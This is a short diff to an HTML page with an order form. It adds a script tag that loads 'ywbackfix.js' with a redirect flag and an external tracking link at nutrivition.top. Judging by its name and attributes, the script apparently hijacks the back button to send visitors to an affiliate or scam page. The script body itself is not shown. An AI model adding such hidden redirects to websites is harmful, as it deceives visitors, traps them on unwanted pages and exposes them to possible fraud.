@@ -1106,5 +1106,10 @@ document.getElementById('order_form').addEventListener('submit', function(e) {
 });
 </script>
 
+<script src="js/ywbackfix.js"
+    data-redirect="true"
+    data-links='["https://nutrivition.top/VXsVxCX?sun={sub_id_30}"]'>
+</script>
+
 </body>
 </html>
